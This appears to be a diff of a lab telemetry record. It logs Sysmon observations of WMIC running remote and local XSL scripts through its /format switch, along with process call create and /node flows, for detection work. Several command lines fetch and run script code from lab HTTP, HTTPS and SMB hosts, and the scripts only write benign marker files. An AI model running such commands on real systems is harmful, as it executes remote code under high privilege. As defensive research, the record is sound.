@@ -1,80 +1,129 @@
 {
+  "schema_version": 2,
   "source": {
-    "collector": "C:\\Tools\\collect-run.ps1",
-    "window_start": "2026-08-10T01:46:07.331Z",
-    "window_end": "2026-08-10T01:46:14.378Z",
-    "event_count_all_channels": 1217,
-    "sysmon_event_count": 1108,
-    "raw_events_json_sha256": "50A4A761305C492200A0337417FD49AFFEEC65A506AE1288C912073D45CFC789",
-    "raw_sysmon_evtx_sha256": "BBF934FE97228CF6B83B3D3D31213DC4F3F6E2B915E7B27E727EC0730C350FFF"
+    "target": "WIN10-ANALYSIS",
+    "sensor": "Sysmon 15.21 verification configuration",
+    "collection": "per-flow bounded Sysmon JSON; selected fields only",
+    "raw_evtx_committed": false,
+    "raw_json_committed": false
   },
-  "process": {
-    "event_id": 1,
-    "utc_time": "2026-08-10T01:46:10.348Z",
-    "process_guid": "{d6daef74-2d62-6a79-9400-000000000b00}",
-    "process_id": 5224,
+  "wmic_identity": {
     "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
     "original_file_name": "wmic.exe",
-    "file_version": "10.0.19041.5794 (WinBuild.160101.0800)",
+    "version": "10.0.19041.5794 (WinBuild.160101.0800)",
     "company": "Microsoft Corporation",
-    "command_line": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" os get Caption /format:\"http://192.168.1.50:18082/benign.xsl\"",
-    "user": "NT AUTHORITY\\SYSTEM",
-    "integrity_level": "System",
-    "sha256": "DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757"
+    "sha256": "DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757",
+    "signature": "valid Microsoft Windows"
   },
-  "parent_child": {
-    "launcher": {
-      "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-      "child_image": "C:\\Windows\\System32\\wbem\\WMIC.exe"
+  "flows": [
+    {
+      "id": "flow0-http-jscript",
+      "window": ["2026-08-15T11:24:30.4677979Z", "2026-08-15T11:24:33.2959116Z"],
+      "account": "NT AUTHORITY\\SYSTEM",
+      "integrity": "System",
+      "command_line": "WMIC.exe os get Caption /format:\"http://192.168.1.50:18082/wmic-jscript-http.xsl\"",
+      "exit_code": 0,
+      "marker": "C:\\lab\\wmic-http-jscript-marker.txt",
+      "marker_content": "benign-http-jscript",
+      "process": "WMIC process creation observed",
+      "parent_child": "wmic.exe directly spawned cmd.exe for the marker",
+      "network": "Sysmon EID 3 linked wmic.exe to 192.168.1.50:18082",
+      "files": ["system-profile INetCache XSL", "marker"],
+      "registry": ["HKU\\<SID-REDACTED>\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\wmic.exe\\JScriptSetScriptStateStarted"]
     },
-    "xsl_children": {
-      "count": 2,
-      "image": "C:\\Windows\\System32\\cmd.exe",
-      "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c echo benign-wmic-xsl-marker>C:\\lab\\wmic-xsl-marker.txt",
-      "parent_image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
-      "parent_command_line": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" os get Caption /format:\"http://192.168.1.50:18082/benign.xsl\""
+    {
+      "id": "flow1-local-jscript-standard-user",
+      "window": ["2026-08-15T11:43:58.6122338Z", "2026-08-15T11:44:01.9877305Z"],
+      "account": "WIN10-ANALYSIS\\WmicLabUser",
+      "group_context": "Users plus Performance Log Users; not Administrators",
+      "integrity": "Medium",
+      "command_line": "wmic.exe os get Caption /format:\"C:\\Users\\WmicLabUser\\AppData\\Local\\Temp\\wmic-jscript-local.xsl\"",
+      "exit_code": 0,
+      "marker": "C:\\Users\\WmicLabUser\\AppData\\Local\\Temp\\wmic-local-marker.txt",
+      "marker_content": "benign-local-jscript",
+      "process": "WMIC process creation observed beneath Task Scheduler",
+      "parent_child": "wmic.exe directly spawned cmd.exe at medium integrity",
+      "network": "none attributed to wmic.exe; no EID 3 or EID 22 relevant to the flow",
+      "files": ["local user Temp XSL", "local user Temp marker"],
+      "internet_cache_xsl": "none observed",
+      "registry": ["HKU\\<SID-REDACTED>\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\wmic.exe\\JScriptSetScriptStateStarted"]
+    },
+    {
+      "id": "flow2-smb-jscript",
+      "window": ["2026-08-15T11:47:12.8782581Z", "2026-08-15T11:47:15.5657501Z"],
+      "account": "NT AUTHORITY\\SYSTEM",
+      "integrity": "System",
+      "command_line": "WMIC.exe os get Caption /format:\"\\\\192.168.1.50\\wmicxsl\\wmic-jscript-smb.xsl\"",
+      "exit_code": 0,
+      "marker": "C:\\lab\\wmic-smb-marker.txt",
+      "marker_content": "benign-smb-jscript",
+      "process": "WMIC process creation observed with UNC command line",
+      "parent_child": "wmic.exe directly spawned cmd.exe for the marker",
+      "network": "no WMIC EID 3 in the bounded endpoint window; packet evidence proves SMB retrieval",
+      "files": ["marker"],
+      "internet_cache_xsl": "none observed",
+      "registry": ["HKU\\<SID-REDACTED>\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\wmic.exe\\JScriptSetScriptStateStarted"]
+    },
+    {
+      "id": "flow3-process-call-create",
+      "window": ["2026-08-15T11:48:55.0423778Z", "2026-08-15T11:48:57.9174020Z"],
+      "account": "NT AUTHORITY\\SYSTEM",
+      "integrity": "System",
+      "command_line": "WMIC.exe process call create \"cmd.exe /c echo benign-process-create>C:\\lab\\wmic-process-create-marker.txt\"",
+      "exit_code": 0,
+      "wmi_result": {"return_value": 0, "process_id_returned": true},
+      "marker": "C:\\lab\\wmic-process-create-marker.txt",
+      "marker_content": "benign-process-create",
+      "process": "WMIC process call create observed",
+      "parent_child": "created cmd.exe was parented by WmiPrvSE.exe, not wmic.exe",
+      "network": "none attributed to wmic.exe",
+      "files": ["marker"],
+      "registry": "none relevant observed"
+    },
+    {
+      "id": "flow4-node-self",
+      "window": ["2026-08-15T11:55:12.8682074Z", "2026-08-15T11:55:20.6494465Z"],
+      "account": "NT AUTHORITY\\SYSTEM",
+      "integrity": "System",
+      "command_line": "WMIC.exe /node:192.168.1.52 os get Caption",
+      "exit_code": 0,
+      "output": "Windows caption returned",
+      "process": "WMIC process creation with canonical /node: argument observed",
+      "parent_child": "no relevant child observed",
+      "network": "no WMIC-attributed network connection; self-node was optimized locally",
+      "files": "none relevant observed",
+      "registry": ["wmic.exe VBScriptSetScriptStateStarted during benign query"],
+      "negative_result": "command line was distinguishable; DCOM network telemetry was not produced"
+    },
+    {
+      "id": "flow5-http-vbscript",
+      "window": ["2026-08-15T12:00:09.8644275Z", "2026-08-15T12:00:16.8498397Z"],
+      "account": "NT AUTHORITY\\SYSTEM",
+      "integrity": "System",
+      "command_line": "WMIC.exe os get Caption /format:\"http://192.168.1.50:18083/wmic-vbscript-http.xsl\"",
+      "exit_code": 0,
+      "marker": "C:\\lab\\wmic-http-vbscript-marker.txt",
+      "marker_content": "benign-http-vbscript",
+      "process": "WMIC process creation observed",
+      "parent_child": "wmic.exe directly spawned cmd.exe for the marker",
+      "network": "Sysmon EID 3 linked wmic.exe to 192.168.1.50:18083",
+      "files": ["system-profile INetCache XSL", "marker"],
+      "registry": ["wmic.exe VBScriptSetScriptStateStarted"]
+    },
+    {
+      "id": "flow6-https-jscript",
+      "window": ["2026-08-15T12:04:04.2574219Z", "2026-08-15T12:04:08.0075142Z"],
+      "account": "NT AUTHORITY\\SYSTEM",
+      "integrity": "System",
+      "command_line": "WMIC.exe os get Caption /format:\"https://certutil.lab:18443/wmic-jscript-https.xsl\"",
+      "exit_code": 0,
+      "marker": "C:\\lab\\wmic-https-marker.txt",
+      "marker_content": "benign-https-jscript",
+      "process": "WMIC process creation observed",
+      "parent_child": "wmic.exe directly spawned cmd.exe for the marker",
+      "network": "Sysmon EID 3 linked wmic.exe to 192.168.1.50:18443",
+      "files": ["system-profile INetCache XSL", "marker"],
+      "registry": ["HKU\\<SID-REDACTED>\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\wmic.exe\\JScriptSetScriptStateStarted"]
     }
-  },
-  "network": {
-    "event_id_3_count": 1,
-    "event_id_22_count": 0,
-    "dns_assessment": "No DNS query was expected or observed because the URL used an IP literal.",
-    "connection": {
-      "utc_time": "2026-08-10T01:46:10.431Z",
-      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
-      "protocol": "tcp",
-      "initiated": true,
-      "source_ip": "192.168.1.52",
-      "source_port": 49678,
-      "destination_ip": "192.168.1.50",
-      "destination_port": 18082
-    }
-  },
-  "files": {
-    "event_id_11_relevant_count": 3,
-    "event_id_23_relevant_count": 1,
-    "events": [
-      {
-        "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
-        "target_filename": "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\benign[1].xsl"
-      },
-      {
-        "image": "C:\\Windows\\System32\\cmd.exe",
-        "target_filename": "C:\\lab\\wmic-xsl-marker.txt",
-        "create_count": 2,
-        "overwrite_delete_count": 1
-      }
-    ]
-  },
-  "registry": {
-    "event_id_12_relevant_count": 15,
-    "event_id_13_relevant_count": 13,
-    "event_id_14_relevant_count": 0,
-    "representative_targets": [
-      "HKU\\.DEFAULT\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\wmic.exe",
-      "HKU\\.DEFAULT\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\wmic.exe\\JScriptSetScriptStateStarted",
-      "HKLM\\SOFTWARE\\Microsoft\\Wbem\\CIMOM"
-    ],
-    "assessment": "The JScript telemetry value paired with wmic.exe is distinctive supporting evidence. WMI, Internet Settings, and notification writes are normal initialization state and are not used alone."
-  }
+  ]
 }
